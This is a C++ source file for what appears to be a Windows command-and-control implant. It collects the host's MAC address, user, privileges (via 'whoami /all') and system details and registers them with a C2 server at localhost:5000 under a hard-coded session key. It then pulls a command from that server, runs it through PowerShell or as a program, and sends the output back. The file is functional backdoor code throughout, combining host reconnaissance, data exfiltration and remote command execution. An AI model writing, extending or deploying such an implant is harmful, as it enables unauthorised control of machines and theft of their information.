#include <iostream>
#include <string>
#include "libs/nlohmann/json.hpp"
#include "execution/execution.hpp"
#include "crypto/aesgcm.hpp"
#include "comms/comms.hpp"
#include "file_io/file_io.h"
#include "sitawareness/sitawareness.hpp"
#include "config/config.hpp"

using json = nlohmann::json;


std::string get_mac_address(){
    std::string mac_address = "wmic path Win32_NetworkAdapter where \"PNPDeviceID like \'%PCI%\' AND AdapterTypeID=\'0\'\" get MacAddress";
    LPSTR mac =  const_cast<char *>(mac_address.c_str());

    
    std::string mac_id = runProgram(mac);
    std::istringstream ss(mac_id);
    std::string id;
    ss >> id;
    ss >> id;
    std::cout << id << std::endl;
    return id;
}

std::string get_privilege_info(){
    std::string cmd = "whoami /all";
    LPSTR priv =  const_cast<char *>(cmd.c_str());

    
    std::string priv_info = runProgram(priv);
    return priv_info;
}

int main(){
    CONFIG config;
    std::string info = getInfo();
    // std::cout << info << std::endl;

    json j = json::parse(info);
    // std::cout << j["systeminfo"] << std::endl;
    
    config.computer_guid = get_mac_address();
    config.c2_fqdn = "localhost";
    config.c2_port = 5000;

    std::string sys = j["systeminfo"];
    json sys_info = json::parse(sys);
    json reg;
    // reg["computer_guid"] = config.computer_guid;
    // std::cout << sys_info["Network Card(s)"] << std::endl;
    
    std::cout <<  sys_info["Network Card(s)"] << std::endl;
    reg[ "computer_guid"] = config.computer_guid;
    reg["computer_name"] = sys_info["Host Name"];
    reg["computer_user"] = j["whoami"]; 
    reg["computer_privileges"] = get_privilege_info();
    reg["connecting_ip_address"] = sys_info["Network Card(s)"];
    reg["session_key"] = "askdgjassgf";


    std::cout << post(config.c2_fqdn,config.c2_port,"/register",reg.dump()) << std::endl;
    std::string get_cmd_resp = getNextCommand(config);
    json command = json::parse(get_cmd_resp);
    std::string cmd_result;
    std::string cmd_text;
    std::string cmd_id = command["command_id"];
    if(cmd_id != "-1"){
        cmd_text = command["command_text"];
        LPSTR cmd =  const_cast<char *>(cmd_text.c_str());
        if (command["command_type"] == "shell"){
            cmd_result = runPowershellCommand(cmd);
        }else{
           cmd_result = runProgram(cmd);
        }
       std::cout << sendCommandResult(config,cmd_id,cmd_result) << std::endl;
    }



    
    return 0;
}